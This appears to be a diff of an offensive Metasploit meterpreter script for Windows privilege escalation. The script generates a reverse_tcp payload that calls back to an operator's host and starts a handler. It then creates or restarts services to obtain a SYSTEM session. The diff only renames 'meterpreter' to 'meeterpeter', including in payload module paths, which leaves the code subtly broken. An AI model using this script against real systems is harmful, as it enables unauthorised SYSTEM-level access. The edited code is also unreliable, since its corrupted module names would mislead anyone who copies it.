@@ -1,5 +1,5 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -19,7 +19,7 @@
 ##
 
 if client.platform !~ /win32/
-  print_error("This version of Meterpreter is not supported with this Script!")
+  print_error("This version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
 #
@@ -63,7 +63,7 @@ tempdir = envs['TEMP']
 sysdir = envs['SYSTEMROOT']
 
 # Get the exe payload.
-pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+pay = client.framework.payloads.create("windows/meeterpeter/reverse_tcp")
 pay.datastore['LHOST'] = rhost
 pay.datastore['LPORT'] = rport
 raw  = pay.generate
@@ -78,7 +78,7 @@ fd.close
 
 #get handler to be ready
 handler = client.framework.exploits.create("multi/handler")
-handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
+handler.datastore['PAYLOAD'] = "windows/meeterpeter/reverse_tcp"
 handler.datastore['LHOST']   = rhost
 handler.datastore['LPORT']   = rport
 handler.datastore['InitialAutoRunScript'] = "migrate -f"
@@ -109,7 +109,7 @@ if(manag["return"] != 0)
   if(newservice["return"] != 0)
     print_status("Created service... #{newservice["return"]}")
     ret = adv.StartServiceA(newservice["return"], 0, nil)
-    print_status("Service should be started! Enjoy your new SYSTEM meterpreter session.")
+    print_status("Service should be started! Enjoy your new SYSTEM meeterpeter session.")
     service_delete("walservice")
     adv.CloseServiceHandle(newservice["return"])
     if aggressive == false
@@ -184,7 +184,7 @@ service_list.each do |serv|
       if(adv.ControlService(servhandleret["return"],1,56))
         client.railgun.kernel32.Sleep(1000)
         adv.StartServiceA(servhandleret["return"],0,nil)
-        print_status("#{serv} restarted. You should get a system meterpreter soon. Enjoy.")
+        print_status("#{serv} restarted. You should get a system meeterpeter soon. Enjoy.")
         #Cleanup
         if moved == true
           client.railgun.kernel32.MoveFileExA(source+'.bak', source, 1)
